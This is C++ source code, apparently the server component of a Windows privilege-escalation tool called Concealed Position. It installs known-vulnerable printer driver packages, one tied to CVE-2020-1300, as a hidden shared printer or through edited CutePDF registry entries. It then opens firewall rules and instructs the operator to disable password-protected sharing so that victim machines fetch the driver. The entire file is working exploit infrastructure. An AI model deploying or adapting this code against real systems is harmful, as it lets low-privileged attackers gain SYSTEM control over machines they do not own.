#include <cstdlib>
#include <string>
#include <filesystem>
#include <windows.h>
#include <fstream>
#include <Shlobj.h>
#include <map>
#include "popl.hpp"

namespace
{
	struct exploit
	{
		const std::string name;
		const std::string drivername;
		const std::string inf_path;
		const std::string cab_path;
	};

	std::map<std::string, const struct exploit> s_exploits =
	{
		{ "RADIANTDAMAGE", { "RADIANTDAMAGE", "Canon TR150 series", "TR1506.inf", "RADIANTDAMAGE\\TR1506.cab" } },
		{ "POISONDAMAGE", { "POISONDAMAGE", "PCL6 Driver for Universal Print", "oemsetup.inf", "POISONDAMAGE\\oemsetup.cab" } },
		{ "ACIDDAMAGE",  { "ACIDDAMAGE", "Lexmark Universal v2", "LMUD1o40.inf", "ACIDDAMAGE\\LMUD1o40.cab" } },
		{ "SLASHINGDAMAGE", { "SLASHINGDAMAGE", "", "slashing_damage.inf", "SLASHINGDAMAGE\\cve20201300.cab" } }
	};

	bool parseCLI(int p_argc, const char* p_argv[], std::string& p_exploit, std::string& p_cab_files)
	{
		popl::OptionParser op("CLI options");
		auto help = op.add<popl::Switch>("h", "help", "Display the help message");
		auto exploit = op.add<popl::Value<std::string>>("e", "exploit", "The exploit to use");
		auto cab_directory = op.add<popl::Value<std::string>>("c", "cabs", "The location of the cabinet files", ".\\cab_files");
		op.parse(p_argc, p_argv);

		if (p_argc == 1 || help->is_set())
		{
			std::cout << op << std::endl;
			std::cout << "Exploits available:" << std::endl;

			for (const auto& [name, exploit]: s_exploits)
			{
				std::cout << "\t" << name << std::endl;
			}
			return false;
		}

		if (!exploit->is_set())
		{
			std::cerr << "[-] Must provide an exploit." << std::endl;
			return false;
		}
		else if (s_exploits.find(exploit->value(0)) == s_exploits.end())
		{
			std::cout << "[!] User provided exploit is invalid" << std::endl;
			return false;
		}

		p_cab_files.assign(cab_directory->value(0));
		p_exploit.assign(exploit->value(0));
		return true;
	}

	bool configure_with_cutepdf(const std::string& p_exploitName, const std::string& p_cab_files)
	{
		std::cout << "[+] Checking CutePDF Writer is installed" << std::endl;
		HKEY hqtRead = NULL;
		if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\ControlSet001\\Control\\Print\\Environments\\Windows x64\\Drivers\\Version-3\\CutePDF Writer v4.0", 0, KEY_READ, &hqtRead) != ERROR_SUCCESS)
		{
			std::cout << "[!] CutePDF Writer doesn't appear to be installed." << std::endl;
			RegCloseKey(hqtRead);
			return false;
		}
		RegCloseKey(hqtRead);

		std::cout << "[+] Staging " + p_exploitName + " files for CutePDF" << std::endl;
		std::filesystem::create_directory("C:\\" + p_exploitName);
		std::string inf_path("C:\\" + p_exploitName + "\\" + s_exploits[p_exploitName].inf_path);
		try
		{
			std::filesystem::copy(p_cab_files + "\\" + s_exploits[p_exploitName].cab_path, "C:\\Windows\\System32\\spool\\drivers\\x64\\PCC\\");
		}
		catch (const std::exception& e)
		{
			std::cout << e.what() << std::endl;
			return false;
		}
		// create an empty file
		std::ofstream ofs(inf_path, std::ios::binary | std::ios::out);
		ofs.close();

		std::cout << "[+] Opening CutePDF Writer registry for writing" << std::endl;
		HKEY hqtWrite = NULL;
		if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\ControlSet001\\Control\\Print\\Environments\\Windows x64\\Drivers\\Version-3\\CutePDF Writer v4.0", 0, KEY_WRITE, &hqtWrite) != ERROR_SUCCESS)
		{
			std::cout << "[!] Insufficient permissions to edit registry?." << std::endl;
			RegCloseKey(hqtWrite);
			return false;
		}

		std::cout << "[+] Setting PrinterDriverAttributes" << std::endl;
		uint32_t attr = 1;
		RegSetValueEx(hqtWrite, L"PrinterDriverAttributes", 0, REG_DWORD, (BYTE*)&attr, sizeof(uint32_t));

		std::wstring winf_path(inf_path.begin(), inf_path.end());
		std::cout << "[+] Setting InfPath" << std::endl;
		RegSetValueEx(hqtWrite, L"InfPath", 0, REG_SZ, (const BYTE*)winf_path.c_str(), (DWORD)winf_path.size() * 2);
		RegCloseKey(hqtWrite);

		return true;
	}

	bool configure_shared_printer(const std::string& p_exploitName, const std::string& p_cab_directory)
	{
		std::cout << "[+] Creating temporary space..." << std::endl;
		system("mkdir .\\tmp > nul");

		std::string cab_file = p_cab_directory + "\\" + s_exploits[p_exploitName].cab_path;
		std::cout << "[+] Expanding " << cab_file << std::endl;
		system(std::string("expand -F:* " + cab_file + " tmp > null").c_str());

		std::cout << "[+] Pushing into the driver store" << std::endl;
		std::string cab_inf = ".\\tmp\\" + s_exploits[p_exploitName].inf_path;
		system(std::string("pnputil.exe /add-driver " + cab_inf + " > nul").c_str());

		std::cout << "[+] Cleaning up tmp space" << std::endl;
		system("rmdir /s /q tmp > nul");

		std::cout << "[+] Installing print driver" << std::endl;
		std::wstring wdriver(s_exploits[p_exploitName].drivername.begin(), s_exploits[p_exploitName].drivername.end());
		HRESULT hr = InstallPrinterDriverFromPackage(NULL, NULL, wdriver.c_str(), NULL, 0);
		if (FAILED(hr))
		{
			std::cout << "[-] Driver is not available." << std::endl;
			return false;
		}

		std::cout << "[+] Driver installed!" << std::endl;

		std::cout << "[+] Installing shared printer" << std::endl;
		std::wstring wName(s_exploits[p_exploitName].name.begin(), s_exploits[p_exploitName].name.end());
		PRINTER_INFO_2 printerInfo = { };
		ZeroMemory(&printerInfo, sizeof(printerInfo));
		printerInfo.pPortName = (LPWSTR)L"lpt1:";
		printerInfo.pDriverName = (LPWSTR)wdriver.c_str();
		printerInfo.pShareName = (LPWSTR)wName.c_str();
		printerInfo.pPrinterName = (LPWSTR)wName.c_str();
		printerInfo.pPrintProcessor = (LPWSTR)L"WinPrint";
		printerInfo.pDatatype = (LPWSTR)L"RAW";
		printerInfo.pComment = (LPWSTR)L"Concealed Position";
		printerInfo.pLocation = (LPWSTR)L"Underdark";
		printerInfo.Attributes = PRINTER_ATTRIBUTE_RAW_ONLY | PRINTER_ATTRIBUTE_HIDDEN | PRINTER_ATTRIBUTE_SHARED;
		printerInfo.AveragePPM = 9001;
		HANDLE hPrinter = AddPrinter(NULL, 2, (LPBYTE)&printerInfo);
		if (hPrinter == 0)
		{
			std::cerr << "[-] Failed to create printer: " << GetLastError() << std::endl;
			return false;
		}
		ClosePrinter(hPrinter);

		std::cout << "[+] Shared printer installed!" << std::endl;
		return true;
	}
}

int main(int p_argc, const char* p_argv[])
{
	std::cout << " _______  _______  __    _  _______  _______  _______  ___      _______  ______  " << std::endl;
	std::cout << "|       ||       ||  |  | ||       ||       ||   _   ||   |    |       ||      | " << std::endl;
	std::cout << "|       ||   _   ||   |_| ||       ||    ___||  |_|  ||   |    |    ___||  _    |" << std::endl;
	std::cout << "|       ||  | |  ||       ||       ||   |___ |       ||   |    |   |___ | | |   |" << std::endl;
	std::cout << "|      _||  |_|  ||  _    ||      _||    ___||       ||   |___ |    ___|| |_|   |" << std::endl;
	std::cout << "|     |_ |       || | |   ||     |_ |   |___ |   _   ||       ||   |___ |       |" << std::endl;
	std::cout << "|_______||_______||_|  |__||_______||_______||__| |__||_______||_______||______| " << std::endl;
	std::cout << " _______  _______  _______  ___   _______  ___   _______  __    _                " << std::endl;
	std::cout << "|       ||       ||       ||   | |       ||   | |       ||  |  | |               " << std::endl;
	std::cout << "|    _  ||   _   ||  _____||   | |_     _||   | |   _   ||   |_| |               " << std::endl;
	std::cout << "|   |_| ||  | |  || |_____ |   |   |   |  |   | |  | |  ||       |               " << std::endl;
	std::cout << "|    ___||  |_|  ||_____  ||   |   |   |  |   | |  |_|  ||  _    |               " << std::endl;
	std::cout << "|   |    |       | _____| ||   |   |   |  |   | |       || | |   |               " << std::endl;
	std::cout << "|___|    |_______||_______||___|   |___|  |___| |_______||_|  |__|    server!    " << std::endl;
	std::cout << std::endl;

	std::string exploitName;
	std::string cab_directory;
	if (!parseCLI(p_argc, p_argv, exploitName, cab_directory))
	{
		return EXIT_FAILURE;
	}

	if (!IsUserAnAdmin())
	{
		std::cerr << "[!] Run this program as an administrator" << std::endl;
		return EXIT_FAILURE;
	}

	if (s_exploits[exploitName].drivername.empty())
	{
		// use cutepdf writer to serve up this driver
		if (!configure_with_cutepdf(exploitName, cab_directory))
		{
			return EXIT_FAILURE;
		}
	}
	else
	{
		// otherwise use a standard shared printer
		if (!configure_shared_printer(exploitName, cab_directory))
		{
			return EXIT_FAILURE;
		}
	}

	// turn on file and printer sharing
	system("netsh advfirewall firewall set rule group=\"File and Printer Sharing\" new enable=Yes > nul");

	std::cout << "[+] Automation Done." << std::endl;
	if (s_exploits[exploitName].drivername.empty())
	{
		std::cout << "[+] Done." << std::endl;
		std::cout << "[!] IMPORTANT MANUAL STEPS!" << std::endl;
		std::cout << "[1] Set CutePDF Writer as a shared printer" << std::endl;
		std::cout << "[2] In Advanced Sharing Settings, Turn off password protected sharing." << std::endl;
		std::cout << "[3] Reboot" << std::endl;
		std::cout << "[4] Ready to go!" << std::endl;
	}
	else
	{
		std::cout << "[!] IMPORTANT MANUAL STEPS!" << std::endl;
		std::cout << "[0] In Advanced Sharing Settings, Turn off password protected sharing." << std::endl;
		std::cout << "[1] Ready to go!" << std::endl;
	}
	return EXIT_SUCCESS;
}
